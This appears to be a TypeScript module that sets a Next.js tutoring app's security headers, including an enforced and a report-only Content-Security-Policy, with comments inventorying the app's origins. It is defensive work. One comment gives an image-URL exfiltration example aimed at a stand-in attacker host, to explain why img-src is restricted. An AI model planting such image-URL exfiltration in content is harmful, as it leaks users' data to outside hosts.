/**
 * The response security headers next.config.ts `headers()` sets on every
 * route. Pure, so the set is pinned by securityHeaders.test.ts; evaluated at
 * BUILD time (next.config is), so every origin below is the build's.
 *
 * ── The Content-Security-Policy, and why it is two headers ─────────────────
 *
 * The ENFORCED policy (`Content-Security-Policy`) is every directive this app
 * can state exactly from what it loads — the inventory below — and leaves
 * `script-src`/`style-src`/`default-src` out, so they stay unrestricted:
 *
 *   img-src      'self' data: blob:, the Supabase project (avatars,
 *                cosmetic assets, room images — public storage buckets),
 *                Google profile photos (OAuth `picture`, stored as
 *                users.avatar_url), and the public site (the admin email
 *                preview's header image is EMAIL_ASSET_BASE_URL, which
 *                staging points at the prod site).
 *                This is the directive that closes the exfiltration channel:
 *                a model- or user-supplied `<img src="https://attacker/?q=…">`
 *                (markdown, a mermaid label, a room message) is never fetched.
 *   connect-src  'self' (the /api rewrite, the /ingest PostHog proxy, SSE,
 *                /api/auth/session) + the Supabase project over https and
 *                its realtime websocket over wss. Nothing in src/ fetches a
 *                cross-origin URL otherwise (lib/api.ts API_URL is '').
 *   frame-src    'self' + GeoGebra (the tutor's ::geogebra directive). The
 *                admin email preview is an `srcdoc` frame, which frame-src
 *                does not govern.
 *   frame-ancestors 'none', base-uri 'self', form-action 'self' (every
 *                <form> is handled in JS), object-src 'none'.
 *
 * The full policy, scripts and styles included, ships REPORT-ONLY
 * (`Content-Security-Policy-Report-Only`). Next.js renders inline scripts on
 * every page (the RSC payload `self.__next_f.push(...)`, plus our
 * GUMMI_BOOT_SCRIPT), so a script-src without 'unsafe-inline' needs a
 * per-request nonce: Next only stamps one when a middleware sets it on every
 * request AND every page renders dynamically. Here the middleware runs only
 * on the (shell) routes (middleware.test.ts pins its matcher) and the public
 * pages are statically prerendered for the Workers asset cache, so a nonce
 * would mean making the whole site dynamic on OpenNext/Cloudflare — a change
 * no unit test can verify and that a wrong guess breaks silently. Instead the
 * report-only header states the policy we intend to enforce
 * (script-src 'self' 'unsafe-inline' — external script origins refused,
 * eval refused) so the browser lane's console shows what would break first.
 * Known in advance: function-plot (```plot fences) compiles expressions with
 * `new Function` (math-codegen), so it will report an eval violation.
 *
 * ── Origin inventory (frontend/src, 2026-11) ───────────────────────────────
 *   same origin   pages, /_next assets, /api/* (rewrite to BACKEND_URL),
 *                 /ingest/* (PostHog proxy; posthog-js api_host), fonts in
 *                 app/fonts (next/font/local), KaTeX fonts (bundled CSS)
 *   Supabase      NEXT_PUBLIC_SUPABASE_URL: storage uploads/public URLs
 *                 (chat-images, cosmetic-assets, avatars) + realtime (wss)
 *   Google        *.googleusercontent.com avatars (img); OAuth itself is a
 *                 popup/top-level navigation to the API origin, not CSP-bound
 *   fonts.saplinglearn.com   licensed Gummi face (lib/licensedFonts.ts)
 *   fonts.googleapis.com / fonts.gstatic.com   the admin email preview's
 *                 template stylesheet (backend services/email_templates.py)
 *   www.geogebra.org   tutor-embedded applets (iframe)
 *   blob:/data:   upload previews, avatar crop, mermaid/plot SVG, cosmetics
 */

export interface SecurityHeaderEnv {
  NODE_ENV?: string;
  NEXT_PUBLIC_SUPABASE_URL?: string;
}

export interface Header {
  key: string;
  value: string;
}

/** Google OAuth profile photos (users.avatar_url from the `picture` claim). */
export const GOOGLE_AVATAR_ORIGIN = "https://*.googleusercontent.com";
/** The public site: the admin email preview's header image host on staging. */
export const PUBLIC_SITE_ORIGIN = "https://saplinglearn.com";
export const GUMMI_FONT_ORIGIN = "https://fonts.saplinglearn.com";
export const GEOGEBRA_ORIGIN = "https://www.geogebra.org";
export const GOOGLE_FONTS_CSS_ORIGIN = "https://fonts.googleapis.com";
export const GOOGLE_FONTS_FILE_ORIGIN = "https://fonts.gstatic.com";

/** Every Supabase project, used only when the build names none (see below). */
const SUPABASE_ANY = { http: "https://*.supabase.co", ws: "wss://*.supabase.co" };

/**
 * The Supabase project origin over http(s) and its realtime websocket origin.
 *
 * A build without NEXT_PUBLIC_SUPABASE_URL has no browser Supabase client,
 * but the avatar URLs the backend stores still point at its project, so the
 * policy falls back to any `*.supabase.co` project rather than blocking every
 * avatar. A malformed value is treated the same way.
 */
export function supabaseOrigins(raw: string | undefined): { http: string; ws: string } {
  const value = (raw ?? "").trim();
  if (!value) return SUPABASE_ANY;
  let u: URL;
  try {
    u = new URL(value);
  } catch {
    return SUPABASE_ANY;
  }
  if (u.protocol !== "https:" && u.protocol !== "http:") return SUPABASE_ANY;
  return { http: u.origin, ws: `${u.protocol === "https:" ? "wss:" : "ws:"}//${u.host}` };
}

type Directives = Array<[string, string[]]>;

function serialise(directives: Directives): string {
  return directives.map(([name, sources]) => [name, ...sources].join(" ")).join("; ");
}

/** The directives enforced on every response (see the header comment). */
export function enforcedCspDirectives(env: SecurityHeaderEnv): Directives {
  const supabase = supabaseOrigins(env.NEXT_PUBLIC_SUPABASE_URL);
  const dev = env.NODE_ENV === "development";
  return [
    ["img-src", ["'self'", "data:", "blob:", supabase.http, GOOGLE_AVATAR_ORIGIN, PUBLIC_SITE_ORIGIN]],
    // `next dev` HMR is a same-origin websocket; 'self' covers ws: in current
    // browsers, the explicit scheme keeps an older one working in dev only.
    ["connect-src", ["'self'", supabase.http, supabase.ws, ...(dev ? ["ws:"] : [])]],
    ["frame-src", ["'self'", GEOGEBRA_ORIGIN]],
    ["frame-ancestors", ["'none'"]],
    ["base-uri", ["'self'"]],
    ["form-action", ["'self'"]],
    ["object-src", ["'none'"]],
  ];
}

/**
 * The whole intended policy, sent report-only: the enforced directives plus
 * default-src, script-src and style-src, which cannot be verified without the
 * browser lane (see the header comment).
 */
export function reportOnlyCspDirectives(env: SecurityHeaderEnv): Directives {
  const dev = env.NODE_ENV === "development";
  return [
    ["default-src", ["'self'"]],
    // 'unsafe-eval' in dev only: React's dev build and HMR evaluate code.
    ["script-src", ["'self'", "'unsafe-inline'", ...(dev ? ["'unsafe-eval'"] : [])]],
    // React style attributes, the injected Gummi faces and mermaid's SVG
    // <style> are inline; the email preview pulls the template's font CSS.
    ["style-src", ["'self'", "'unsafe-inline'", GOOGLE_FONTS_CSS_ORIGIN]],
    ["font-src", ["'self'", "data:", GUMMI_FONT_ORIGIN, GOOGLE_FONTS_FILE_ORIGIN]],
    ["worker-src", ["'self'", "blob:"]],
    ["media-src", ["'self'", "blob:", "data:"]],
    ["manifest-src", ["'self'"]],
    ...enforcedCspDirectives(env),
  ];
}

export function contentSecurityPolicy(env: SecurityHeaderEnv): string {
  return serialise(enforcedCspDirectives(env));
}

export function contentSecurityPolicyReportOnly(env: SecurityHeaderEnv): string {
  return serialise(reportOnlyCspDirectives(env));
}

/**
 * Features the app never uses (no getUserMedia, geolocation, payments or
 * WebUSB anywhere in src/), denied to the page and every frame it embeds.
 */
export const PERMISSIONS_POLICY = "camera=(), microphone=(), geolocation=(), payment=(), usb=()";

/** Every header next.config.ts sets on `/(.*)`. */
export function securityHeaders(env: SecurityHeaderEnv): Header[] {
  return [
    // Lets the Google sign-in popup keep its opener (SignInModal) while
    // isolating the page from every other cross-origin window.
    { key: "Cross-Origin-Opener-Policy", value: "same-origin-allow-popups" },
    { key: "Strict-Transport-Security", value: "max-age=31536000; includeSubDomains" },
    { key: "X-Content-Type-Options", value: "nosniff" },
    { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
    // The legacy twin of frame-ancestors 'none', for browsers without CSP 2.
    { key: "X-Frame-Options", value: "DENY" },
    { key: "Permissions-Policy", value: PERMISSIONS_POLICY },
    { key: "Content-Security-Policy", value: contentSecurityPolicy(env) },
    { key: "Content-Security-Policy-Report-Only", value: contentSecurityPolicyReportOnly(env) },
  ];
}
